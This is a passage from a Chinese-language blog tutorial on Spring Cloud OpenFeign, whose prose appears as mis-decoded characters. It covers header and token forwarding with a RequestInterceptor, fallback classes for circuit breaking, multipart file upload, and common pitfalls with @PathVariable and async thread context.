<p>ä¸ºäº†å®ç°è¿™ä¸€åŠŸèƒ½ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å®ç°RequestInterceptoræ¥å£æ¥åŠ¨æ€æ·»åŠ  Header ä¿¡æ¯ã€‚é¦–å…ˆï¼Œåˆ›å»ºä¸€ä¸ªå®ç°ç±»ï¼Œä¾‹å¦‚FeignAuthInterceptor.javaï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> feign.RequestInterceptor;
<span class="hljs-keyword">import</span> feign.RequestTemplate;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;
<span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;
<span class="hljs-keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;

<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FeignAuthInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RequestInterceptor</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">apply</span><span class="hljs-params">(RequestTemplate template)</span> {
        <span class="hljs-type">ServletRequestAttributes</span> <span class="hljs-variable">attributes</span> <span class="hljs-operator">=</span> (ServletRequestAttributes) RequestContextHolder.currentRequestAttributes();
        <span class="hljs-keyword">if</span> (attributes != <span class="hljs-literal">null</span>) {
            <span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> attributes.getRequest().getHeader(<span class="hljs-string">"Authorization"</span>);
            <span class="hljs-keyword">if</span> (token != <span class="hljs-literal">null</span>) {
                template.header(<span class="hljs-string">"Authorization"</span>, token);
            }
        }
    }
}
</code></pre>
<p>åœ¨ä¸Šè¿°ä»£ç ä¸­ï¼ŒFeignAuthInterceptorå®ç°äº†RequestInterceptoræ¥å£çš„applyæ–¹æ³•ã€‚åœ¨è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œæˆ‘ä»¬é¦–å…ˆé€šè¿‡RequestContextHolderè·å–å½“å‰çš„è¯·æ±‚å±æ€§ï¼Œç„¶åä»è¯·æ±‚å¤´ä¸­è·å–Authorizationå­—æ®µï¼ˆå³ Tokenï¼‰ã€‚å¦‚æœ Token å­˜åœ¨ï¼Œå°±å°†å…¶æ·»åŠ åˆ° Feign è¯·æ±‚çš„å¤´ä¿¡æ¯ä¸­ã€‚è¿™æ ·ï¼Œå½“ Feign å‘èµ·è¿œç¨‹è°ƒç”¨æ—¶ï¼Œå°±ä¼šæºå¸¦è¿™ä¸ª Tokenï¼Œå®ç°äº†æœåŠ¡é—´é‰´æƒå‡­è¯çš„ä¼ é€’ã€‚</p>
<p>é€šè¿‡è¿™ç§æ–¹å¼ï¼Œæˆ‘ä»¬ä¸ä»…å¯ä»¥ä¼ é€’ Tokenï¼Œè¿˜å¯ä»¥æ ¹æ®ä¸šåŠ¡éœ€æ±‚ä¼ é€’å…¶ä»–è‡ªå®šä¹‰çš„ Header ä¿¡æ¯ï¼Œæ¯”å¦‚ç”¨æˆ·è¯­è¨€ç¯å¢ƒã€ç°åº¦æ ‡è¯†ç­‰ï¼Œæ»¡è¶³å„ç§å¤æ‚çš„ä¸šåŠ¡åœºæ™¯éœ€æ±‚ï¼Œç¡®ä¿å¾®æœåŠ¡æ¶æ„ä¸­å„ä¸ªæœåŠ¡ä¹‹é—´çš„é€šä¿¡å®‰å…¨å’Œé¡ºç•…ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8dd28cbd593f45b98d0cd73f714105c7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH5bCP5rGk5ZyG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771228108&amp;x-signature=EBy9bjLN7Oc%2F%2Fkbzn858e%2FdkuJ0%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-23"><strong>4.3 ç†”æ–­é™çº§ï¼šæœåŠ¡å®¹é”™çš„ â€œä¿éšœâ€</strong></h3>
<p>åœ¨å¤æ‚çš„å¾®æœåŠ¡æ¶æ„ä¸­ï¼ŒæœåŠ¡ä¹‹é—´çš„ä¾èµ–å…³ç³»é”™ç»¼å¤æ‚ï¼Œä»»ä½•ä¸€ä¸ªæœåŠ¡å‡ºç°æ•…éšœéƒ½å¯èƒ½å¼•å‘è¿é”ååº”ï¼Œå¯¼è‡´æ•´ä¸ªç³»ç»Ÿçš„å´©æºƒï¼Œè¿™å°±æ˜¯æ‰€è°“çš„ â€œæœåŠ¡é›ªå´©â€ æ•ˆåº”ã€‚ä¸ºäº†é˜²æ­¢è¿™ç§æƒ…å†µçš„å‘ç”Ÿï¼ŒFeign ç»“åˆ Hystrix æˆ– Sentinel ç­‰ç»„ä»¶ï¼Œæä¾›äº†å¼ºå¤§çš„ç†”æ–­é™çº§åŠŸèƒ½ï¼Œä¸ºæœåŠ¡çš„ç¨³å®šæ€§å’Œå¯é æ€§ä¿é©¾æŠ¤èˆªã€‚</p>
<p>ä»¥ Hystrix ä¸ºä¾‹ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨ Feign è°ƒç”¨å…¶ä»–æœåŠ¡æ—¶ï¼Œå¦‚æœè¢«è°ƒç”¨çš„æœåŠ¡ï¼ˆæ¯”å¦‚ ServiceAï¼‰å› ä¸ºç½‘ç»œæ•…éšœã€èµ„æºè€—å°½ç­‰åŸå› æ— æ³•æ­£å¸¸å“åº”ï¼ŒFeign ä¼šåœ¨ä¸€å®šæ—¶é—´å†…å°è¯•é‡è¯•ã€‚ä½†å¦‚æœé‡è¯•å¤šæ¬¡åä»ç„¶å¤±è´¥ï¼ŒHystrix å°±ä¼šè§¦å‘ç†”æ–­æœºåˆ¶ï¼Œå°±åƒç”µè·¯ä¸­çš„ä¿é™©ä¸ä¸€æ ·ï¼Œåˆ‡æ–­å¯¹ ServiceA çš„è°ƒç”¨ï¼Œé¿å…å› ä¸æ–­å°è¯•è°ƒç”¨ä¸å¯ç”¨çš„æœåŠ¡è€Œæ¶ˆè€—å¤§é‡çš„ç³»ç»Ÿèµ„æºã€‚</p>
<p>åŒæ—¶ï¼ŒFeign é€šè¿‡@FeignClientæ³¨è§£çš„fallbackå±æ€§æŒ‡å®šé™çº§ç±»ã€‚è¿™ä¸ªé™çº§ç±»éœ€è¦å®ç° Feign æ¥å£ï¼Œå½“ç†”æ–­å‘ç”Ÿæ—¶ï¼ŒFeign ä¼šè°ƒç”¨é™çº§ç±»ä¸­çš„æ–¹æ³•ï¼Œæ‰§è¡Œå…œåº•é€»è¾‘ï¼Œè¿”å›ä¸€ä¸ªé¢„è®¾çš„é»˜è®¤å€¼æˆ–è€…æç¤ºä¿¡æ¯ï¼Œè€Œä¸æ˜¯æŠ›å‡ºå¼‚å¸¸ï¼Œä»è€Œä¿è¯è°ƒç”¨æ–¹çš„ä¸šåŠ¡èƒ½å¤Ÿç»§ç»­è¿›è¡Œã€‚</p>
<p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªUserServiceFeignClientæ¥å£ï¼Œç”¨äºè°ƒç”¨ç”¨æˆ·æœåŠ¡è·å–ç”¨æˆ·ä¿¡æ¯ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> org.springframework.cloud.openfeign.FeignClient;
<span class="hljs-keyword">import</span> org.springframework.web.bind.<span class="hljs-keyword">annotation</span>.GetMapping;
<span class="hljs-keyword">import</span> org.springframework.web.bind.<span class="hljs-keyword">annotation</span>.PathVariable;

<span class="hljs-meta">@FeignClient(name = <span class="hljs-string">"user-service"</span>, fallback = UserServiceFallback.class)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserServiceFeignClient</span> {
    <span class="hljs-meta">@GetMapping(<span class="hljs-string">"/user/{id}"</span>)</span>
    User getUserById(<span class="hljs-meta">@PathVariable</span> <span class="hljs-built_in">Long</span> id);
}
</code></pre>
<p>åœ¨ä¸Šè¿°ä»£ç ä¸­ï¼Œ@FeignClientæ³¨è§£çš„fallbackå±æ€§æŒ‡å®šäº†é™çº§ç±»ä¸ºUserServiceFallbackã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦å®ç°è¿™ä¸ªé™çº§ç±»ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.stereotype.Component;

<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceFallback</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserServiceFeignClient</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUserById</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-comment">// è¿™é‡Œç¼–å†™å…œåº•é€»è¾‘ï¼Œæ¯”å¦‚è¿”å›ä¸€ä¸ªé»˜è®¤ç”¨æˆ·ä¿¡æ¯</span>
        <span class="hljs-type">User</span> <span class="hljs-variable">defaultUser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();
        defaultUser.setId(-<span class="hljs-number">1L</span>);
        defaultUser.setName(<span class="hljs-string">"é»˜è®¤ç”¨æˆ·"</span>);
        defaultUser.setAge(<span class="hljs-number">0</span>);
        <span class="hljs-keyword">return</span> defaultUser;
    }
}
</code></pre>
<p>åœ¨UserServiceFallbackç±»ä¸­ï¼Œå®ç°äº†UserServiceFeignClientæ¥å£çš„getUserByIdæ–¹æ³•ã€‚å½“ç”¨æˆ·æœåŠ¡ä¸å¯ç”¨æ—¶ï¼ŒFeign ä¼šè°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œè¿”å›ä¸€ä¸ªé»˜è®¤çš„ç”¨æˆ·ä¿¡æ¯ï¼Œé¿å…å› è°ƒç”¨å¤±è´¥è€Œå¯¼è‡´æ•´ä¸ªä¸šåŠ¡æµç¨‹ä¸­æ–­ã€‚</p>
<p>é€šè¿‡è¿™ç§ç†”æ–­é™çº§æœºåˆ¶ï¼ŒFeign èƒ½å¤Ÿæœ‰æ•ˆåœ°æé«˜ç³»ç»Ÿçš„å®¹é”™èƒ½åŠ›ï¼Œåœ¨é¢å¯¹å„ç§å¼‚å¸¸æƒ…å†µæ—¶ï¼Œä¾ç„¶èƒ½å¤Ÿä¿è¯éƒ¨åˆ†ä¸šåŠ¡çš„æ­£å¸¸è¿è¡Œï¼Œæå‡äº†ç³»ç»Ÿçš„æ•´ä½“ç¨³å®šæ€§å’Œç”¨æˆ·ä½“éªŒã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/44981e14a3324b57a62afa255670677f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH5bCP5rGk5ZyG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771228108&amp;x-signature=NTkkhN0yAfEDbeZUEcBK4574Rb0%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-24"><strong>4.4 ç‰¹æ®Šåœºæ™¯ï¼šFeign å®ç°æ–‡ä»¶ä¸Šä¼ </strong></h3>
<p>åœ¨å¾®æœåŠ¡æ¶æ„ä¸­ï¼Œé™¤äº†å¸¸è§çš„æ•°æ®äº¤äº’ï¼Œæ–‡ä»¶ä¸Šä¼ ä¹Ÿæ˜¯ä¸€ä¸ªå¸¸è§çš„ä¸šåŠ¡éœ€æ±‚ã€‚ç„¶è€Œï¼ŒFeign é»˜è®¤å¹¶ä¸ç›´æ¥æ”¯æŒæ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œè¿™å°±éœ€è¦æˆ‘ä»¬é€šè¿‡ä¸€äº›é¢å¤–çš„é…ç½®å’Œä»£ç å®ç°æ¥æ»¡è¶³è¿™ä¸€ç‰¹æ®Šåœºæ™¯ã€‚</p>
<p>ä¸ºäº†è®© Feign èƒ½å¤Ÿæ”¯æŒæ–‡ä»¶ä¸Šä¼ ï¼Œé¦–å…ˆéœ€è¦å¼•å…¥feign-formä¾èµ–ï¼Œè¿™ä¸ªä¾èµ–æä¾›äº†å¯¹å¤šéƒ¨åˆ†è¡¨å•æ•°æ®çš„æ”¯æŒï¼Œæ˜¯å®ç°æ–‡ä»¶ä¸Šä¼ çš„å…³é”®ã€‚åœ¨pom.xmlæ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹ä¾èµ–ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.github.openfeign.form<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>feign-form<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.8.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.github.openfeign.form<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>feign-form-spring<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.8.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>å¼•å…¥ä¾èµ–åï¼Œè¿˜éœ€è¦é…ç½®ä¸€ä¸ªè‡ªå®šä¹‰çš„ç¼–ç å™¨SpringFormEncoderï¼Œç”¨äºå¤„ç†æ–‡ä»¶ä¸Šä¼ æ—¶çš„è¡¨å•æ•°æ®ç¼–ç ã€‚åˆ›å»ºä¸€ä¸ªé…ç½®ç±»ï¼Œä¾‹å¦‚FeignMultipartConfig.javaï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> feign.codec.Encoder;
<span class="hljs-keyword">import</span> feign.form.spring.SpringFormEncoder;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;
<span class="hljs-keyword">import</span> org.springframework.http.converter.HttpMessageConverter;
<span class="hljs-keyword">import</span> org.springframework.http.converter.json.MappingJackson2HttpMessageConverter;
<span class="hljs-keyword">import</span> org.springframework.web.client.RestTemplate;

<span class="hljs-keyword">import</span> java.util.ArrayList;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FeignMultipartConfig</span> {
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> Encoder <span class="hljs-title function_">feignFormEncoder</span><span class="hljs-params">()</span> {
        List&lt;HttpMessageConverter&lt;?&gt;&gt; messageConverters = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        messageConverters.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MappingJackson2HttpMessageConverter</span>());
        <span class="hljs-type">RestTemplate</span> <span class="hljs-variable">restTemplate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RestTemplate</span>(messageConverters);
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpringFormEncoder</span>(restTemplate.getMessageConverters());
    }
}
</code></pre>
<p>åœ¨ä¸Šè¿°é…ç½®ç±»ä¸­ï¼Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªfeignFormEncoderæ–¹æ³•ï¼Œè¿”å›ä¸€ä¸ªSpringFormEncoderå®ä¾‹ã€‚è¿™ä¸ªç¼–ç å™¨ç»“åˆäº† Spring çš„æ¶ˆæ¯è½¬æ¢å™¨ï¼Œèƒ½å¤Ÿæ­£ç¡®åœ°å¤„ç†æ–‡ä»¶ä¸Šä¼ æ—¶çš„è¡¨å•æ•°æ®ã€‚</p>
<p>æ¥ä¸‹æ¥ï¼Œå°±å¯ä»¥ç¼–å†™ Feign æ¥å£æ–¹æ³•æ¥å®ç°æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½äº†ã€‚å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„æ¥å£ï¼Œæ¥æ”¶MultipartFileç±»å‹çš„æ–‡ä»¶å‚æ•°ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> feign.Headers;
<span class="hljs-keyword">import</span> org.springframework.cloud.openfeign.FeignClient;
<span class="hljs-keyword">import</span> org.springframework.http.MediaType;
<span class="hljs-keyword">import</span> org.springframework.web.bind.<span class="hljs-keyword">annotation</span>.PostMapping;
<span class="hljs-keyword">import</span> org.springframework.web.bind.<span class="hljs-keyword">annotation</span>.RequestPart;
<span class="hljs-keyword">import</span> org.springframework.web.multipart.MultipartFile;

<span class="hljs-meta">@FeignClient(name = <span class="hljs-string">"file-service"</span>, configuration = FeignMultipartConfig.class)</span>
<span class="hljs-meta">@Headers(<span class="hljs-string">"Content-Type: multipart/form-data"</span>)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">FileUploadFeignClient</span> {
    <span class="hljs-meta">@PostMapping(value = <span class="hljs-string">"/upload"</span>, consumes = MediaType.MULTIPART_FORM_DATA_VALUE)</span>
    String uploadFile(<span class="hljs-meta">@RequestPart(<span class="hljs-string">"file"</span>)</span> MultipartFile file);
}
</code></pre>
<p>åœ¨è¿™ä¸ªFileUploadFeignClientæ¥å£ä¸­ï¼Œ@FeignClientæ³¨è§£æŒ‡å®šäº†è¦è°ƒç”¨çš„æœåŠ¡åï¼Œå¹¶é€šè¿‡configurationå±æ€§å¼•ç”¨äº†æˆ‘ä»¬å‰é¢åˆ›å»ºçš„é…ç½®ç±»FeignMultipartConfigã€‚@Headersæ³¨è§£è®¾ç½®äº†è¯·æ±‚çš„ Content-Type ä¸ºmultipart/form-dataï¼Œè¿™æ˜¯æ–‡ä»¶ä¸Šä¼ æ—¶å¸¸ç”¨çš„å†…å®¹ç±»å‹ã€‚@PostMappingæ³¨è§£å®šä¹‰äº†è¯·æ±‚çš„è·¯å¾„å’Œæ–¹æ³•ï¼Œ@RequestPartæ³¨è§£ç”¨äºç»‘å®šæ–‡ä»¶å‚æ•°ã€‚</p>
<p>é€šè¿‡ä»¥ä¸Šæ­¥éª¤ï¼Œæˆ‘ä»¬æˆåŠŸåœ°åœ¨ Feign ä¸­å®ç°äº†æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œæ»¡è¶³äº†å¾®æœåŠ¡æ¶æ„ä¸­æ–‡ä»¶ä¼ è¾“çš„ç‰¹æ®Šä¸šåŠ¡éœ€æ±‚ï¼Œä½¿å¾— Feign èƒ½å¤Ÿåœ¨æ›´å¹¿æ³›çš„åœºæ™¯ä¸­å‘æŒ¥ä½œç”¨ ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/44396871ffe649bab253710d15fd262f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH5bCP5rGk5ZyG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771228108&amp;x-signature=1BKAB%2Ftgy1fcn1hCUJgQHi%2F%2Fp%2BI%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-25"><strong>äº”ã€é¿å‘æŒ‡å—ï¼šè¿™äº› â€œå‘â€ ä½ è‚¯å®šè¸©è¿‡</strong></h2>
<h3 data-id="heading-26"><strong>5.1 @PathVariable å¿…é¡»æŒ‡å®š value å±æ€§</strong></h3>
<p>åœ¨ä½¿ç”¨ Feign è¿›è¡Œè¿œç¨‹è°ƒç”¨æ—¶ï¼Œ@PathVariableæ³¨è§£çš„ä½¿ç”¨è§„åˆ™ä¸ Spring MVC å­˜åœ¨ä¸€å®šå·®å¼‚ï¼Œè¿™ä¹Ÿæ˜¯è®¸å¤šå¼€å‘è€…å®¹æ˜“è¸©å‘çš„åœ°æ–¹ã€‚åœ¨ Spring MVC ä¸­ï¼Œå½“ä½¿ç”¨@PathVariableæ³¨è§£æ—¶ï¼Œå¦‚æœè·¯å¾„å˜é‡åä¸æ–¹æ³•å‚æ•°åä¸€è‡´ï¼Œæ˜¯å¯ä»¥çœç•¥valueå±æ€§çš„ï¼Œæ¡†æ¶èƒ½å¤Ÿè‡ªåŠ¨è¿›è¡Œå‚æ•°ç»‘å®šã€‚ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@GetMapping</span>(<span class="hljs-string">"/user/{id}"</span>)
public User <span class="hljs-built_in">getUserById</span>(<span class="hljs-variable">@PathVariable</span> Long id) {
    <span class="hljs-comment">// ä¸šåŠ¡é€»è¾‘</span>
}
</code></pre>
<p>ç„¶è€Œï¼Œåœ¨ Feign ä¸­ï¼Œæƒ…å†µå´æœ‰æ‰€ä¸åŒã€‚Feign è¦æ±‚åœ¨ä½¿ç”¨@PathVariableæ³¨è§£æ—¶ï¼Œå¿…é¡»æ˜¾å¼æŒ‡å®švalueå±æ€§ï¼Œå³ä½¿è·¯å¾„å˜é‡åä¸æ–¹æ³•å‚æ•°åç›¸åŒä¹Ÿä¸èƒ½çœç•¥ã€‚å¦åˆ™ï¼Œåœ¨è¿è¡Œæ—¶ä¼šæŠ›å‡ºå‚æ•°ç»‘å®šå¼‚å¸¸ï¼Œå¯¼è‡´è¿œç¨‹è°ƒç”¨å¤±è´¥ã€‚æ¯”å¦‚ï¼Œä¸‹é¢è¿™æ ·çš„ä»£ç åœ¨ Feign ä¸­æ˜¯é”™è¯¯çš„ï¼š</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@FeignClient</span>(name = <span class="hljs-string">"user-service"</span>)
public interface UserFeignClient {
    <span class="hljs-variable">@GetMapping</span>(<span class="hljs-string">"/user/{id}"</span>)
    User <span class="hljs-built_in">getUserById</span>(<span class="hljs-variable">@PathVariable</span> Long id); <span class="hljs-comment">// é”™è¯¯ï¼ŒæœªæŒ‡å®švalueå±æ€§</span>
}
</code></pre>
<p>æ­£ç¡®çš„å†™æ³•åº”è¯¥æ˜¯ï¼š</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@FeignClient</span>(name = <span class="hljs-string">"user-service"</span>)
public interface UserFeignClient {
    <span class="hljs-variable">@GetMapping</span>(<span class="hljs-string">"/user/{id}"</span>)
    User <span class="hljs-built_in">getUserById</span>(<span class="hljs-variable">@PathVariable</span>(<span class="hljs-string">"id"</span>) Long id); <span class="hljs-comment">// æ­£ç¡®ï¼ŒæŒ‡å®švalueå±æ€§ä¸º"id"</span>
}
</code></pre>
<p>è¿™ä¸€å·®å¼‚çš„åŸå› åœ¨äº Feign çš„è®¾è®¡æœºåˆ¶ï¼Œå®ƒå¯¹æ³¨è§£çš„è§£ææ›´ä¸ºä¸¥æ ¼ï¼Œéœ€è¦æ˜ç¡®çš„å…ƒæ•°æ®æ¥ç”Ÿæˆå‡†ç¡®çš„ HTTP è¯·æ±‚ã€‚å› æ­¤ï¼Œåœ¨ä½¿ç”¨ Feign æ—¶ï¼Œå¼€å‘è€…åŠ¡å¿…ç‰¢è®°@PathVariableæ³¨è§£å¿…é¡»æŒ‡å®švalueå±æ€§è¿™ä¸€è§„åˆ™ï¼Œé¿å…å› æ³¨è§£ä½¿ç”¨ä¸å½“è€Œå¼•å‘çš„é—®é¢˜ï¼Œç¡®ä¿è¿œç¨‹è°ƒç”¨çš„é¡ºåˆ©è¿›è¡Œã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/49e1ef1855794aa39ce74a8632031ee5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH5bCP5rGk5ZyG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771228108&amp;x-signature=opIOuB6lF8aEq3TdSKN%2FSjsijTY%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-27"><strong>5.2 Header ä¼ é€’çš„ â€œéšå½¢å‘â€ï¼šä¸Šä¸‹æ–‡ä¸¢å¤±</strong></h3>
<p>åœ¨å¤šçº¿ç¨‹åœºæ™¯ä¸‹ä½¿ç”¨ Feign è¿›è¡Œè¿œç¨‹è°ƒç”¨æ—¶ï¼ŒHeader ä¼ é€’å¯èƒ½ä¼šå‡ºç°æ„æƒ³ä¸åˆ°çš„é—®é¢˜ï¼Œå…¶ä¸­æœ€å¸¸è§çš„å°±æ˜¯ä¸Šä¸‹æ–‡ä¸¢å¤±ï¼Œå¯¼è‡´ Header æ— æ³•æ­£ç¡®ä¼ é€’ã€‚åœ¨å•çº¿ç¨‹ç¯å¢ƒä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡RequestInterceptorè½»æ¾åœ°å°†å½“å‰è¯·æ±‚çš„ Header ä¿¡æ¯æ·»åŠ åˆ° Feign è¯·æ±‚ä¸­ï¼Œå®ç° Header çš„ä¼ é€’ã€‚ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> feign.RequestInterceptor;
<span class="hljs-keyword">import</span> feign.RequestTemplate;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;
<span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;
<span class="hljs-keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;

<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FeignAuthInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RequestInterceptor</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">apply</span><span class="hljs-params">(RequestTemplate template)</span> {
        <span class="hljs-type">ServletRequestAttributes</span> <span class="hljs-variable">attributes</span> <span class="hljs-operator">=</span> (ServletRequestAttributes) RequestContextHolder.currentRequestAttributes();
        <span class="hljs-keyword">if</span> (attributes != <span class="hljs-literal">null</span>) {
            <span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> attributes.getRequest().getHeader(<span class="hljs-string">"Authorization"</span>);
            <span class="hljs-keyword">if</span> (token != <span class="hljs-literal">null</span>) {
                template.header(<span class="hljs-string">"Authorization"</span>, token);
            }
        }
    }
}
</code></pre>
<p>ç„¶è€Œï¼Œå½“æ¶‰åŠåˆ°å¤šçº¿ç¨‹æ—¶ï¼Œæƒ…å†µå°±å˜å¾—å¤æ‚èµ·æ¥ã€‚åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸­ï¼Œæ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„ä¸Šä¸‹æ–‡ï¼ŒSpring çš„RequestContextHolderæ˜¯åŸºäºThreadLocalå®ç°çš„ï¼Œè¿™æ„å‘³ç€å­çº¿ç¨‹æ— æ³•è‡ªåŠ¨ç»§æ‰¿ä¸»çº¿ç¨‹çš„ThreadLocalä¸­çš„ä¸Šä¸‹æ–‡ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œåœ¨ä¸€ä¸ªå¼‚æ­¥ä»»åŠ¡ä¸­ä½¿ç”¨ Feign è°ƒç”¨å…¶ä»–æœåŠ¡ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">scheduling</span>.<span class="hljs-property">annotation</span>.<span class="hljs-property">Async</span>;
<span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">stereotype</span>.<span class="hljs-property">Service</span>;

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {

    <span class="hljs-meta">@Async</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">asyncTask</span>(<span class="hljs-params"/>) {
        <span class="hljs-comment">// è¿™é‡Œè°ƒç”¨Feignå®¢æˆ·ç«¯</span>
        userFeignClient.<span class="hljs-title function_">getUserById</span>(1L);
    }
}
</code></pre>
